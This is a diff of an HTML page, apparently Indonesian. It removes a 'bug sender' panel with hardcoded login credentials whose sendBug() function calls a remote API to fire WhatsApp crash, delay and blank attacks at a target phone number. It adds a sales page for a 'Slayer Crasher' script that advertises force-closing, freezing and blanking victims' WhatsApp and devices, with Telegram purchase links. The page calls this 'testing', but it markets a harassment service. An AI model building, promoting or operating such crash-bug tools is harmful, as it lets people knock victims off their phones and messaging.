@@ -3,316 +3,300 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ApocalypseWeb</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <title>Script WhatsApp & Telegram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&family=Poppins&display=swap" rel="stylesheet">
   <style>
-    :root { --main: #ffffff; --second: #cccccc; --bg: #0e0e0e; --text: #eeeeee; }
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
+    html { scroll-behavior: smooth; }
     body {
-      background: var(--bg); color: var(--text);
-      min-height: 100vh; display: flex;
-      justify-content: center; align-items: center;
-      padding: 20px; position: relative;
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #000;
+      color: #fff;
     }
-    #particles-js { position: fixed; width: 100%; height: 100%; z-index: 0; }
-    .glass-box {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 20px;
-      padding: 30px; backdrop-filter: blur(10px);
-      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
-      z-index: 2; max-width: 450px; width: 100%;
-    }
-    .profile { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
-    .profile img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--main); }
-    .profile-info h2 { font-size: 1.2rem; color: var(--main); }
-    .status { font-size: 0.9rem; color: #bbbbbb; }
-    .status i { color: #ffffff; margin-right: 5px; }
-    h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
-    .neon {
-  color: #0ff;
-  text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
-  animation: flicker 1.5s infinite alternate;
-}
 
-@keyframes flicker {
-  0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-    opacity: 1;
-  }
-  20%, 24%, 55% {
-    opacity: 0.4;
-  }
-}
-    @keyframes neon { from { text-shadow: 0 0 10px var(--main); } to { text-shadow: 0 0 25px var(--second); } }
-    input {
-      background: rgba(255, 255, 255, 0.05);
+    nav {
+      background: #111;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid red;
+      position: sticky;
+      top: 0;
+      z-index: 999;
+    }
+
+    nav h1 {
+      color: red;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 24px;
+    }
+
+    nav ul {
+      display: flex;
+      gap: 20px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    nav ul li a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+
+    nav ul li a:hover {
+      color: red;
+    }
+
+    .hero {
+      background: url('https://files.catbox.moe/japj9n.jpg') no-repeat center;
+      background-size: cover;
+      padding: 120px 20px;
+      text-align: center;
+    }
+
+    .hero h2 {
+      font-size: 36px;
+      font-family: 'Orbitron', sans-serif;
+      animation: fadeIn 1.5s ease-in-out;
+      color: #000;
+    }
+
+    .hero p {
+      max-width: 600px;
+      margin: 15px auto;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .hero button {
+      margin-top: 25px;
+      padding: 12px 25px;
+      background: red;
       color: white;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 12px;
-      padding: 12px;
-      width: 100%;
-      margin-bottom: 10px;
-      transition: 0.3s;
-    }
-    input:focus {
-      outline: none; border: 1px solid var(--main);
-      background: rgba(255, 255, 255, 0.1);
-    }
-    .bug-options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
-    .bug-card {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 15px;
-      padding: 12px 20px;
-      display: flex; align-items: center;
-      gap: 10px; cursor: pointer; transition: 0.3s;
-    }
-    .bug-card i { font-size: 1.2rem; color: #ffffff; }
-    .bug-card span { font-size: 1rem; color: white; }
-    .bug-card:hover { background: rgba(255, 255, 255, 0.1); transform: scale(1.03); }
-    .bug-card.active { border: 2px solid var(--main); box-shadow: 0 0 12px var(--main); }
-    button {
-      background: linear-gradient(135deg, var(--main), var(--second));
       border: none;
-      color: blue;
-      width: 100%;
-      padding: 14px;
-      border-radius: 50px;
-      font-size: 1rem;
+      border-radius: 8px;
+      font-size: 16px;
       cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .hero button:hover {
+      background: #ff2a2a;
+    }
+
+    .chapter-container {
+      display: flex;
+      flex-wrap: wrap;
+      padding: 40px;
+      gap: 40px;
+      justify-content: center;
+    }
+
+    .chapter {
+      background: #111;
+      padding: 20px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 0 20px red;
+      transition: transform 0.3s;
+    }
+
+    .chapter:hover {
+      transform: translateY(-5px);
+    }
+
+    .chapter h3 {
+      color: red;
+      font-size: 20px;
+    }
+
+    .chapter img {
+      width: 100%;
+      border-radius: 8px;
+      margin: 10px 0;
+    }
+
+    .chapter .btn {
+      background: red;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .more {
+      padding: 40px 20px;
+      background: #0d0d0d;
+    }
+
+    .more h4 {
+      color: red;
+      margin-bottom: 10px;
+    }
+
+    .more .scripts {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+    }
+
+    .more .script-box {
+      min-width: 150px;
+      height: 80px;
+      background: #222;
+      border: 2px solid red;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
-      box-shadow: 0 0 15px var(--main);
-      transition: 0.3s;
-      margin-top: 10px;
+      font-size: 13px;
+      border-radius: 8px;
+      transition: background 0.3s;
     }
-    .small-logout {
-      background: rgba(255, 255, 255, 0.1);
-      border: 1px solid var(--main);
-      color: var(--main);
-      font-size: 0.85rem;
-      padding: 8px 16px;
-      border-radius: 12px;
-      margin-top: 10px;
-      cursor: pointer;
-      transition: 0.3s;
-      width: fit-content;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .small-logout:hover {
-      background: rgba(255, 255, 255, 0.2);
-    }
-    #popup {
-  position: fixed;
-  top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0, 0, 0, 0.6);
-  display: flex; justify-content: center; align-items: center;
-  z-index: 999;
-}
-.popup-content {
-  background: #1a1a1a;
-  color: #00ff88;
-  padding: 30px;
-  border-radius: 15px;
-  text-align: center;
-  max-width: 90%;
-  box-shadow: 0 0 20px #00ff88;
-  animation: fadeIn 0.3s ease-in-out;
-  position: relative;
-}
 
-.popup-content .close-btn {
-  position: absolute;
-  top: 10px; right: 15px;
-  font-size: 1.5rem;
-  color: #ff4d4d;
-  cursor: pointer;
-}
+    .script-box:hover {
+      background: #333;
+    }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: scale(0.9); }
-  to { opacity: 1; transform: scale(1); }
-}
+    section {
+      padding: 60px 20px;
+      text-align: center;
+    }
+
+    #about, #contact {
+      background: #111;
+    }
+
+    #about h2, #contact h2 {
+      color: red;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 28px;
+      margin-bottom: 15px;
+    }
+
+    #contact a {
+      display: inline-block;
+      margin-top: 20px;
+      background: red;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px;
+      font-size: 12px;
+      background: #111;
+      color: #aaa;
+    }
+
+    footer a {
+      color: red;
+      text-decoration: none;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
   </style>
 </head>
 <body>
-<div id="particles-js"></div>
-<div id="popup" style="display:none;">
-  <div class="popup-content">
-    <span class="close-btn" onclick="closePopup()">&times;</span>
-    <p id="popup-message"></p>
+
+<!-- Navbar -->
+<nav>
+  <h1>Script Slayer Crasher</h1>
+  <ul>
+    <li><a href="#home">Home</a></li>
+    <li><a href="#chapters">Features</a></li>
+    <li><a href="#about">About</a></li>
+    <li><a href="#contact">Contact</a></li>
+  </ul>
+</nav>
+
+<!-- Hero Section -->
+<div class="hero" id="home">
+  <button onclick="window.location.href='https://t.me/XyHanzyy'">Beli Sekarang!</button>
+</div>
+
+<!-- Features -->
+<div class="chapter-container" id="chapters">
+  <div class="chapter">
+    <h3>Features Android 01: Forclose All Android</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="Dashboard Bot">
+    <p>Forclose all android akan menyebabkan keluar sendiri dan susah untuk diperbaiki, meskipun target telah menghapus/menginstall ulang aplikasi WhatsApp.</p>
+    <button class="btn">Return</button>
+  </div>
+  <div class="chapter">
+    <h3>Features iPhone 02: Forclose iPhone</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="iPhone Forceclose">
+    <p>Crash all WhatsApp untuk pengguna iPhone. Forclose susah di-fix meskipun target telah menginstall ulang WhatsApp.</p>
+    <button class="btn">Return</button>
+  </div>
+  <div class="chapter">
+    <h3>Features All Device 03: Delay Mention</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="Delay Mention">
+    <p>Spam mention delay membuat WhatsApp target lag berat dan delay, bahkan tidak bisa kirim pesan.</p>
+    <button class="btn">Return</button>
+  </div>
+  <div class="chapter">
+    <h3>Features iPhone 04: Delay iPhone</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="Delay iPhone">
+    <p>Khusus pengguna iPhone: WhatsApp akan lemot, delay, tidak responsif, dan susah digunakan.</p>
+    <button class="btn">Return</button>
+  </div>
+  <div class="chapter">
+    <h3>Features iPhone 05: Freeze iPhone</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="Freeze iOS">
+    <p>Freeze akan membuat device iPhone diam tidak bisa digerakkan seperti terkena bug pesan crash.</p>
+    <button class="btn">Return</button>
+  </div>
+  <div class="chapter">
+    <h3>Features Android 06: Blank All WA</h3>
+    <img src="https://files.catbox.moe/japj9n.jpg" alt="Blank All">
+    <p>Blank WhatsApp: layar hitam, device mati total, bahkan susah di-restart atau dikendalikan.</p>
+    <button class="btn">Return</button>
   </div>
 </div>
 
-<div id="login-box" class="glass-box">
-  <h2>Welcome To Server Xzut</h2>
-  
-  <input type="text" id="username" placeholder="Username" />
-  <input type="text"id="password" placeholder="Password"/>
-  <button onclick="login()"><i class="fas fa-sign-in-alt"></i>masuk</button>
-  <div id="login-result" style="margin-top:10px; text-align:center;"></div>
-</div>
-
-<div class="glass-box" id="main-box" style="display:none;">
-  <div class="profile">
-    <img src="https://files.catbox.moe/oeqk8v.png" alt="profile">
-    <div class="profile-info">
-      <h2 id="userLabel">Api Bug</h2>
-      <span class="status"><i class="fas fa-circle"></i> Connected</span>
-    </div>
-  </div>
-  <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
-  <input type="text" id="target" placeholder="628xxxx" />
-<div class="bug-options">
-  <div class="bug-card active" data-bug="crashtotal">
-    <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
-  </div>
-  <div class="bug-card" data-bug="fc">
-    <i class="fas fa-bomb"></i><span>kontol WA</span>
-  </div>
-  <div class="bug-card" data-bug="delay">
-    <i class="fas fa-clock"></i><span>bangke Delay</span>
-  </div>
-  <div class="bug-card" data-bug="blank">
-    <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
-  </div>
-  <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
-  <button class="small-logout" onclick="logout()">Logout</button>
-
-  <div id="result" style="margin-top:10px;"></div>
-  <div class="contact" style="margin-top: 20px; color: white;">
-    <p>Contact Developer:</p>
-    <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
-      <i class="fab fa-telegram"></i> @axpaw O`vovTzmxv
-    </a>
+<!-- More -->
+<div class="more">
+  <h4>More From HanzyyMods</h4>
+  <div class="scripts">
+    <div class="script-box">Panel Pterodactyl</div>
+    <div class="script-box">Jasa Create Website</div>
+    <div class="script-box">Script Bot Telegram</div>
+    <div class="script-box">Script Bot WhatsApp</div>
+    <div class="script-box">Jasa Create Aplikasi</div>
   </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-<script>
-particlesJS("particles-js", {
-  particles: {
-    number: { value: 60, density: { enable: true, value_area: 800 }},
-    color: { value: "#ffffff" },
-    shape: { type: "circle" },
-    opacity: { value: 0.4 },
-    size: { value: 3, random: true },
-    line_linked: {
-      enable: true, distance: 150,
-      color: "#ffffff", opacity: 0.3, width: 1
-    },
-    move: { enable: true, speed: 2, direction: "none", random: false }
-  },
-  interactivity: {
-    events: {
-      onhover: { enable: true, mode: "grab" },
-      onclick: { enable: false }
-    },
-    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
-  },
-  retina_detect: true
-});
+<!-- About -->
+<section id="about">
+  <h2>About Script DemonSlayer Crasher</h2>
+  <p>Spider Crasher adalah script bot Telegram buatan @XyHanzyy yang bisa eksekusi forclose, delay, blank, dll untuk testing sistem WhatsApp secara ekstrim.</p>
+</section>
 
-function logout() {
-  sessionStorage.removeItem("currentUser");
-  location.reload();
-}
+<!-- Contact -->
+<section id="contact">
+  <h2>Contact & Pembelian</h2>
+  <p>Jika kamu tertarik membeli script atau ingin bertanya, hubungi kami lewat Telegram.</p>
+  <a href="https://t.me/XyHanzyy" target="_blank">Hubungi via Telegram</a>
+</section>
 
-function saveSession(user) {
-  sessionStorage.setItem("currentUser", JSON.stringify(user));
-}
+<!-- Footer -->
+<footer>
+  <p>© 2025 Slayer Crasher • Made by <a href="https://t.me/XyHanzyy">@DemonHanzy</a> • UI Inspired by Netflix Design</p>
+</footer>
 
-function getSession() {
-  return JSON.parse(sessionStorage.getItem("currentUser"));
-}
-
-window.onload = () => {
-  const user = getSession();
-  if (user) showDashboard(user);
-};
-
-function showPopup(message) {
-  document.getElementById("popup-message").innerHTML = message;
-  document.getElementById("popup").style.display = "flex";
-}
-
-function closePopup() {
-  document.getElementById("popup").style.display = "none";
-}
-
-// ✅ GANTI DI SINI: Username dan Password dicek langsung dari HTML
-const userList = [
-  { username: "admin", password: "admin123" },
-  { username: "xzut", password: "kontol" }
-];
-
-function login() {
-  const user = document.getElementById("username").value.trim();
-  const pass = document.getElementById("password").value.trim();
-  const result = document.getElementById("login-result");
-
-  const found = userList.find(u => u.username === user && u.password === pass);
-
-  if (found) {
-    saveSession(found);
-    showDashboard(found);
-  } else {
-    result.innerText = "❌ Username atau Password salah!";
-    result.style.color = "crimson";
-  }
-}
-
-function showDashboard(user) {
-  document.getElementById("login-box").style.display = "none";
-  document.getElementById("main-box").style.display = "block";
-  document.getElementById("userLabel").innerText = user.username;
-}
-
-let selectedBug = "crashtotal";
-document.querySelectorAll(".bug-card").forEach(card => {
-  card.addEventListener("click", () => {
-    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
-    card.classList.add("active");
-    selectedBug = card.getAttribute("data-bug");
-  });
-});
-
-async function sendBug() {
-  const input = document.getElementById("target").value.trim();
-  const resDiv = document.getElementById("result");
-  const btn = document.getElementById("sendBtn");
-
-  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
-    resDiv.innerText = "Masukkan nomor WA yang valid!";
-    resDiv.style.color = "crimson";
-    return;
-  }
-
-  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
-  btn.disabled = true;
-  const originalHTML = btn.innerHTML;
-  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
-  resDiv.innerText = "";
-
-  try {
-    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-    const json = await res.json();
-
-    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
-  } catch (err) {
-    resDiv.innerText = "❌ Gagal fetch: " + err;
-    resDiv.style.color = "crimson";
-  }
-
-  btn.disabled = false;
-  btn.innerHTML = originalHTML;
-}
-</script>
 </body>
-      </html>
+</html>
     
